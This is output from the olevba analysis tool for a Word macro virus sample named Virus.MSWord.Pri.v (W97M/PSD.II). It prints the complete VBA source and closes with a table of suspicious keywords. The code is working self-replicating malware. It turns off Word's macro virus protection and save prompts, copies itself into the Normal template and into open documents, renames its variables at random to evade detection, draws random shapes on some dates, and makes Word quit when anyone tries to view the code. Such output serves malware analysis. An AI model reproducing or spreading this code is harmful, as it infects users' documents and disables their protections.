olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.v-f60c9d7ae170d3be04250dd3e749142ab2b316f1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.v-f60c9d7ae170d3be04250dd3e749142ab2b316f1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = False: Options.VirusProtection = False: Options.SaveNormalPrompt = False
If Day(Now) > Minute(Now) Then
Randomize: For BM9690 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next BM9690: End If
MC239 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
PI2867 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set GA7183 = ActiveDocument.VBProject.VBComponents.Item(1)
BI4214 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set GA7183 = NormalTemplate.VBProject.VBComponents.Item(1)
QJ6392 = True
Call BE4811_RR8122
ActiveDocument.Saved = True
End If
If QJ6392 <> True And BI4214 <> True Then GoTo DF436
If QJ6392 = True Then GA7183.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, MC239 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If BI4214 = True Then GA7183.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, PI2867 - 4))
DF436:
If PI2867 <> 0 And MC239 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function BE4811_RR8122()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "FH2199": r1(2) = "FU21": r1(3) = "CR3095": r1(4) = "EU6751": r1(5) = "RR8122": r1(6) = "MC239"
r1(7) = "PI2867": r1(8) = "BI4214":: r1(9) = "GA7183": r1(10) = "QJ6392": r1(11) = "DF436": r1(12) = "BE4811": r1(13) = "SB6857": r1(14) = "NK2928": r1(15) = "BM9690"
For BM9690 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call RR8122(a1, r1(BM9690))
Next BM9690
End Function 'VAMP v1.0 [thanks Vic!]
Private Function RR8122(NK2928, SB6857 As String)
On Error Resume Next
Dim FH2199 As Long: Dim FU21 As Long: Dim CR3095 As Long: Dim EU6751 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
FH2199 = 1: FU21 = 1: CR3095 = .CountOfLines: EU6751 = Len(.Lines(.CountOfLines, 1))
Do While .Find(SB6857, FH2199, FU21, CR3095, EU6751, True)
strline = .Lines(FH2199, 1)
strline = Left(strline, FU21 - 1) & NK2928 & Mid(strline, EU6751)
.replaceline FH2199, strline
FH2199 = CR3095 + 1: FU21 = 1:
CR3095 = .CountOfLines
EU6751 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function

Private Sub Document_C()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For LP6860 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next LP6860: End If
KQ8133 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
CM9031 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set HV823 = ActiveDocument.VBProject.VBComponents.Item(1)
OT7120 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set HV823 = NormalTemplate.VBProject.VBComponents.Item(1)
BN320 = True
Call KD5741_KM6385
ActiveDocument.Saved = True
End If
If BN320 <> True And OT7120 <> True Then GoTo VN151
If BN320 = True Then HV823.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KQ8133 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If OT7120 = True Then HV823.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CM9031 - 4))
VN151:
If CM9031 <> 0 And KQ8133 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function KD5741_KM6385()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "FD8988": r1(2) = "UP8720": r1(3) = "IG4087": r1(4) = "TL7973": r1(5) = "KM6385": r1(6) = "KQ8133"
r1(7) = "CM9031": r1(8) = "OT7120":: r1(9) = "HV823": r1(10) = "BN320": r1(11) = "VN151": r1(12) = "KD5741": r1(13) = "HD853": r1(14) = "FS9162": r1(15) = "LP6860"
For LP6860 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call KM6385(a1, r1(LP6860))
Next LP6860
End Function 'VAMP v1.0 [thanks Vic!]
Private Function KM6385(FS9162, HD853 As String)
On Error Resume Next
Dim FD8988 As Long: Dim UP8720 As Long: Dim IG4087 As Long: Dim TL7973 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
FD8988 = 1: UP8720 = 1: IG4087 = .CountOfLines: TL7973 = Len(.Lines(.CountOfLines, 1))
Do While .Find(HD853, FD8988, UP8720, IG4087, TL7973, True)
strline = .Lines(FD8988, 1)
strline = Left(strline, UP8720 - 1) & FS9162 & Mid(strline, TL7973)
.replaceline FD8988, strline
FD8988 = IG4087 + 1: UP8720 = 1:
IG4087 = .CountOfLines
TL7973 = Len(.Lines(.CountOfLines, 1))
Sub ViewVBCode()
Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

